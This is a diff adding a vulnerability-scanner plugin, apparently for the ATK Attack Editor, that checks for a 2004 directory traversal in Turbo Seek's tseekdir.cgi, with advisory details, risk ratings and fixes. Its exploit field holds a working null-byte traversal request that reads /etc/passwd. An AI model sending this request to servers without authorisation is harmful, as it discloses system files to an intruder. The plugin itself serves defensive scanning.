@@ -1,0 +1,46 @@
+<plugin_id>230</plugin_id>
+<plugin_name>Turbo Seek prior 1.7.2 tseekdir_cgi directory traversal</plugin_name>
+<plugin_family>CGI</plugin_family>
+<plugin_created_date>2004/09/15</plugin_created_date>
+<plugin_created_name>Marc Ruef</plugin_created_name>
+<plugin_created_email>marc dot ruef at computec dot ch</plugin_created_email>
+<plugin_created_web>http://www.computec.ch</plugin_created_web>
+<plugin_created_company>computec.ch</plugin_created_company>
+<plugin_updated_name>Marc Ruef</plugin_updated_name>
+<plugin_updated_email>marc dot ruef at computec dot ch</plugin_updated_email>
+<plugin_updated_web>http://www.computec.ch</plugin_updated_web>
+<plugin_updated_company>computec.ch</plugin_updated_company>
+<plugin_updated_date>2004/11/14</plugin_updated_date>
+<plugin_version>2.0</plugin_version>
+<plugin_changelog>Corrected the plugin structure and added the accuracy values in 1.1. Improved the pattern matching and introduced the plugin changelog in 2.0</plugin_changelog>
+<plugin_protocol>tcp</plugin_protocol>
+<plugin_port>80</plugin_port>
+<plugin_procedure_exploit>open|send GET /cgi/tseekdir.cgi?location=/etc/passwd%00 HTTP/1.0\n\n|sleep|close|pattern_exists HTTP/#.# ### *root:*</plugin_procedure_exploit>
+<plugin_exploit_accuracy>99</plugin_exploit_accuracy>
+<plugin_comment>This plugin was written with the ATK Attack Editor.</plugin_comment>
+<bug_published_name>durito</bug_published_name>
+<bug_published_email>durito at mail dot ru</bug_published_email>
+<bug_published_date>2004/09/12</bug_published_date>
+<bug_advisory>http://www.focalmedia.net/version.txt</bug_advisory>
+<bug_affected>Turbo Seek prior 1.7.2</bug_affected>
+<bug_not_affected>Turbo Seek 1.7.2 and newer or other solutions</bug_not_affected>
+<bug_vulnerability_class>Directory Traversal</bug_vulnerability_class>
+<bug_description>The remote host is running Turbo Seek, a search engine and directory tool. The remote host is running a version prior 1.7.2 which contains a file content disclosure. This may allow a malicious user to read arbitrary files on the remote server with the privileges the remote web server is running with (usually root or nobody).</bug_description>
+<bug_solution>The server should be deactivated or de-installed if not necessary. If this is not possible, you should upgrade the software to the latest version. To make it harder to find the server the daemon could be configured to listen at another port (e.g. 8081). Try to prevent unwanted connection attempts by filtering traffic with firewalling. Alternation of the application banner can confuse an attacker and let him determine the wrong software.</bug_solution>
+<bug_fixing_time>Approx. 30 minutes</bug_fixing_time>
+<bug_exploit_availability>Yes</bug_exploit_availability>
+<bug_exploit_url>http://www.securityfocus.com/bid/11163/exploit/</bug_exploit_url>
+<bug_remote>Yes</bug_remote>
+<bug_local>Yes</bug_local>
+<bug_severity>High</bug_severity>
+<bug_popularity>6</bug_popularity>
+<bug_simplicity>8</bug_simplicity>
+<bug_impact>8</bug_impact>
+<bug_risk>7</bug_risk>
+<bug_nessus_risk>High</bug_nessus_risk>
+<bug_check_tool>Nessus is also able to do the same check.</bug_check_tool>
+<source_securityfocus_bid>11163</source_securityfocus_bid>
+<source_nessus_id>14719</source_nessus_id>
+<source_literature>Hacking Exposed: Network Security Secrets & Solutions, Stuart McClure, Joel Scambray and George Kurtz, February 25, 2003, 4th Edition, McGraw-Hill Osborne Media, ISBN 0072227427</source_literature>
+<source_misc>http://www.focalmedia.net/version.txt</source_misc>
+
